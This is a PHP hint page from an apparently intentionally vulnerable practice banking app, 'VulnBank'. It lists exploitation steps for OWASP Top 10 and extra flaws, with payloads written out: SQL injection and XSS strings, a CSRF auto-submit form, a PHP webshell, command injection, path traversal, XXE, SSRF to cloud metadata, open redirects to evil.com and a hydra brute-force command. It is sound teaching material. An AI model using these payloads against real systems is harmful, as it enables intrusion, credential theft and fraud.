<?php
require_once 'db.php';
require '_header.php';

$vulns = [
    [
        'id'     => 'A01',
        'name'   => 'Broken Access Control',
        'color'  => '#e74c3c',
        'where'  => 'dashboard.php, transactions.php, admin.php, register.php',
        'how'    => [
            'IDOR: Change <code>?id=</code> or <code>?user_id=</code> to any integer → view any user\'s account/transactions',
            'Admin cookie bypass: DevTools → Application → Cookies → add <code>admin_override = vulnbank_admin</code>, then visit admin.php',
            'URL bypass: visit <code>admin.php?debug=1</code>',
            'Mass assignment: on register.php, DevTools → Elements → change hidden <code>role</code> field from <code>user</code> to <code>admin</code>',
        ],
        'impact' => 'Full account takeover, admin panel access, other users\' financial data exposure',
    ],
    [
        'id'     => 'A02',
        'name'   => 'Cryptographic Failures',
        'color'  => '#8e44ad',
        'where'  => 'db.php, index.php (remember-me cookie), _footer.php, admin.php',
        'how'    => [
            'Passwords stored as unsalted MD5. Visit admin panel → copy any hash → crack at <a href="https://crackstation.net" target="_blank">crackstation.net</a>',
            '"Remember me" encodes <code>username:password</code> in base64: <code>base64_decode(cookie)</code> gives plaintext credentials',
            'View Page Source → HTML comments in footer expose APP_SECRET and DB file path',
            'Visit <code>.env</code> directly → all secrets in plaintext',
        ],
        'impact' => 'Credential theft, session hijacking, lateral movement via leaked secrets',
    ],
    [
        'id'     => 'A03',
        'name'   => 'Injection (SQLi + Stored XSS)',
        'color'  => '#e67e22',
        'where'  => 'index.php (login), search.php, transfer.php, profile.php',
        'how'    => [
            '<strong>Login SQLi:</strong> Username: <code>admin\' --</code>, Password: anything → bypasses password check',
            '<strong>Search UNION:</strong> Query: <code>%\' UNION SELECT 1,username,password,email,5,6,7 FROM users--</code>',
            '<strong>Stored XSS (bio):</strong> profile.php → Bio field → enter <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>',
            '<strong>Stored XSS (message):</strong> profile.php → Community Board → <code>&lt;img src=x onerror=alert(1)&gt;</code> → fires on dashboard.php',
            '<strong>Transfer description SQLi:</strong> Description field: <code>\'),(1,1,99999,\'injected\')--</code>',
        ],
        'impact' => 'Full DB dump, authentication bypass, session cookie theft via XSS',
    ],
    [
        'id'     => 'A04',
        'name'   => 'Insecure Design',
        'color'  => '#16a085',
        'where'  => 'transfer.php, register.php',
        'how'    => [
            'Negative transfer: transfer.php → Amount: <code>-5000</code> → deducts from recipient, credits sender (steal money)',
            'No email verification on registration → create accounts with fake emails',
            'No password complexity → register with password <code>a</code>',
            'Security question answers are trivially guessable (pet names, city names)',
        ],
        'impact' => 'Financial fraud via negative transfers, account enumeration',
    ],
    [
        'id'     => 'A05',
        'name'   => 'Security Misconfiguration',
        'color'  => '#2980b9',
        'where'  => 'phpinfo.php, .env, _footer.php, reset.php',
        'how'    => [
            'Visit <code>/phpinfo.php</code> → full PHP configuration, file paths, environment vars',
            'Visit <code>/.env</code> → plaintext AWS keys, SMTP password, API tokens',
            'View Page Source on any page → HTML comments expose DB path, server OS, APP_SECRET',
            'Password reset → View Source → answer to security question in HTML comment',
            'Default credentials: admin/admin123 shown on login page',
        ],
        'impact' => 'Full environment fingerprinting, credential theft, targeted attack enablement',
    ],
    [
        'id'     => 'A06',
        'name'   => 'Vulnerable & Outdated Components',
        'color'  => '#7f8c8d',
        'where'  => '_header.php (Bootstrap 4.0.0-alpha.6, jQuery 1.12.4)',
        'how'    => [
            'jQuery 1.12.4: CVE-2019-11358 (prototype pollution), CVE-2020-11022/23 (XSS via html())',
            'Bootstrap 4.0.0-alpha.6: multiple known XSS vectors in data-* attributes',
            'No SRI hashes on CDN scripts → supply-chain attack if CDN is compromised',
        ],
        'impact' => 'XSS, prototype pollution, supply-chain compromise',
    ],
    [
        'id'     => 'A07',
        'name'   => 'Identification & Authentication Failures',
        'color'  => '#c0392b',
        'where'  => 'index.php, reset.php, logout.php',
        'how'    => [
            'No brute-force lockout → try hydra: <code>hydra -l admin -P rockyou.txt http-post-form "/:username=^USER^&password=^PASS^:Invalid"</code>',
            'Session fixation: set <code>PHPSESSID=known_value</code> before login → session ID not regenerated',
            'Remember-me cookie contains plaintext password encoded in base64',
            'Password reset needs only the security question answer (no email OTP)',
            'After logout, old PHPSESSID may still be valid (session not server-side invalidated)',
        ],
        'impact' => 'Account takeover, credential stuffing, session hijacking',
    ],
    [
        'id'     => 'A08',
        'name'   => 'Software & Data Integrity Failures',
        'color'  => '#1abc9c',
        'where'  => 'transfer.php (no CSRF), profile.php (unserialize)',
        'how'    => [
            '<strong>CSRF:</strong> While logged in, open a new tab and paste:<br><code>&lt;form action="http://localhost:8080/transfer.php" method="POST"&gt;&lt;input name="to_account" value="VB-0000001"&gt;&lt;input name="amount" value="1000"&gt;&lt;input name="description" value="hacked"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code>',
            '<strong>PHP Object Injection:</strong> DevTools → set cookie <code>user_prefs = ' . base64_encode('O:8:"stdClass":1:{s:4:"test";s:5:"owned";}') . '</code>',
        ],
        'impact' => 'Forced money transfers (CSRF), potential RCE via PHP gadget chains',
    ],
    [
        'id'     => 'A09',
        'name'   => 'Security Logging & Monitoring Failures',
        'color'  => '#95a5a6',
        'where'  => 'Entire application',
        'how'    => [
            'Failed logins not counted or alerted → brute-force goes undetected',
            'Successful logins not logged (no IP, timestamp, user agent recorded)',
            'Money transfers create a DB record but no audit log, no email alert',
            'Admin panel access not logged',
            'Password reset not alerted via email to account holder',
        ],
        'impact' => 'Attacks go unnoticed; no forensic evidence; no alerting',
    ],
    [
        'id'     => 'A10',
        'name'   => 'Server-Side Request Forgery (SSRF)',
        'color'  => '#d35400',
        'where'  => 'profile.php → Avatar URL',
        'how'    => [
            '<strong>Local file read:</strong> Avatar URL: <code>file:///etc/passwd</code>',
            '<strong>Read app secrets:</strong> <code>file:///Users/pisitkoolplukpol/Work/vuln-bank/.env</code>',
            '<strong>Internal port scan:</strong> <code>http://127.0.0.1:22</code>, <code>http://127.0.0.1:3306</code>',
            '<strong>Cloud metadata (AWS):</strong> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>',
            '<strong>Internal services:</strong> <code>http://localhost:8080/admin.php</code> (admin page fetched by server)',
        ],
        'impact' => 'Internal network reconnaissance, credential theft, cloud metadata exfiltration',
    ],
    // ── Extra vulnerabilities (beyond OWASP Top 10 base) ─────
    [
        'id'     => 'EXTRA',
        'name'   => 'Command Injection',
        'color'  => '#c0392b',
        'where'  => 'ping.php',
        'how'    => [
            '<code>127.0.0.1; id</code>',
            '<code>127.0.0.1 && cat .env</code>',
            '<code>127.0.0.1 | ls -la</code>',
            '<code>$(whoami)</code> — subshell injection',
        ],
        'impact' => 'Full OS command execution as the web server user',
    ],
    [
        'id'     => 'EXTRA',
        'name'   => 'Path Traversal',
        'color'  => '#8e44ad',
        'where'  => 'download.php',
        'how'    => [
            '<code>download.php?file=.env</code>',
            '<code>download.php?file=db.php</code>',
            '<code>download.php?file=vulnbank.db</code> (raw SQLite)',
            '<code>download.php?file=....//....//etc/passwd</code> (bypass str_replace)',
        ],
        'impact' => 'Arbitrary file read — credentials, source code, DB dump',
    ],
    [
        'id'     => 'EXTRA',
        'name'   => 'Unrestricted File Upload',
        'color'  => '#e67e22',
        'where'  => 'upload.php',
        'how'    => [
            'Create <code>shell.php</code> containing <code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code>',
            'Upload via upload.php — no extension or MIME check',
            'Access <code>/uploads/shell.php?cmd=id</code> → RCE',
            'Double extension: <code>shell.php.jpg</code> also works',
        ],
        'impact' => 'Remote code execution via uploaded PHP webshell',
    ],
    [
        'id'     => 'EXTRA',
        'name'   => 'XXE – XML External Entity',
        'color'  => '#16a085',
        'where'  => 'export.php',
        'how'    => [
            'Import XML with <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>',
            'Reference entity in any field: <code>&amp;xxe;</code>',
            'Try SSRF via <code>http://169.254.169.254/latest/meta-data/</code>',
        ],
        'impact' => 'Local file read, SSRF to internal services',
    ],
    [
        'id'     => 'EXTRA',
        'name'   => 'Code Injection (eval)',
        'color'  => '#d35400',
        'where'  => 'eval.php',
        'how'    => [
            'Template: <code>{{system(\'id\')}}</code>',
            '<code>{{file_get_contents(\'.env\')}}</code>',
            '<code>{{shell_exec(\'cat /etc/passwd\')}}</code>',
            '<code>{{var_export(get_defined_vars(), true)}}</code>',
        ],
        'impact' => 'Full PHP code execution — effectively RCE',
    ],
    [
        'id'     => 'EXTRA',
        'name'   => 'Open Redirect',
        'color'  => '#2980b9',
        'where'  => 'redirect.php',
        'how'    => [
            '<code>redirect.php?url=http://evil.com/fake-login</code>',
            '<code>redirect.php?url=//evil.com</code> (protocol-relative)',
            '<code>redirect.php?url=javascript:alert(document.cookie)</code>',
            'Use in phishing emails with legitimate-looking VulnBank domain',
        ],
        'impact' => 'Phishing, session cookie theft, credential harvesting',
    ],
    [
        'id'     => 'EXTRA',
        'name'   => 'Unauthenticated API + CORS *',
        'color'  => '#7f8c8d',
        'where'  => 'api.php',
        'how'    => [
            '<code>curl http://localhost:8080/api.php?action=users</code> — all users + MD5 hashes',
            '<code>curl "http://localhost:8080/api.php?action=config"</code> — all secrets',
            '<code>?action=delete_user&id=3</code> — delete a user, no auth, GET request',
            'CORS * allows any JS on any site to call and read the response',
        ],
        'impact' => 'Full data breach without authentication; cross-origin data theft',
    ],
    [
        'id'     => 'EXTRA',
        'name'   => 'Exposed Sensitive Files',
        'color'  => '#1abc9c',
        'where'  => '.env, backup.sql, config.php, *.php.bak, debug.php',
        'how'    => [
            '<code>/.env</code> — AWS keys, SMTP, API tokens',
            '<code>/backup.sql</code> — full DB dump with hashes + admin SSH notes',
            '<code>/config.php</code> — payment gateway secrets, legacy DB creds',
            '<code>/index.php.bak</code> — source backup (accessible to read)',
            '<code>/debug.php</code> — dumps session, env, DB users, .env content, no auth',
        ],
        'impact' => 'Credential theft, lateral movement, full environment compromise',
    ],
];
?>

<h4 class="mb-4">💡 VulnBank – Security Vulnerability Guide</h4>
<p class="text-muted mb-4">This app is intentionally vulnerable. Use it to practice ethical hacking in a safe, local environment.</p>

<div class="row">
<?php foreach ($vulns as $v): ?>
<div class="col-md-6 mb-4">
  <div class="card shadow hint-card h-100" style="border-left-color: <?= $v['color'] ?>">
    <div class="card-header d-flex align-items-center" style="background:<?= $v['color'] ?>22;border-bottom:2px solid <?= $v['color'] ?>">
      <span class="badge me-2" style="background:<?= $v['color'] ?>;color:#fff;font-size:.85rem"><?= $v['id'] ?></span>
      <strong><?= $v['name'] ?></strong>
    </div>
    <div class="card-body" style="font-size:.85rem">
      <p class="mb-1"><strong>Where:</strong> <code><?= $v['where'] ?></code></p>
      <p class="mb-1"><strong>How to exploit:</strong></p>
      <ul class="mb-2 ps-3">
        <?php foreach ($v['how'] as $step): ?>
        <li><?= $step ?></li>
        <?php endforeach; ?>
      </ul>
      <p class="mb-0 text-danger"><strong>Impact:</strong> <?= $v['impact'] ?></p>
    </div>
  </div>
</div>
<?php endforeach; ?>
</div>

<?php require '_footer.php'; ?>
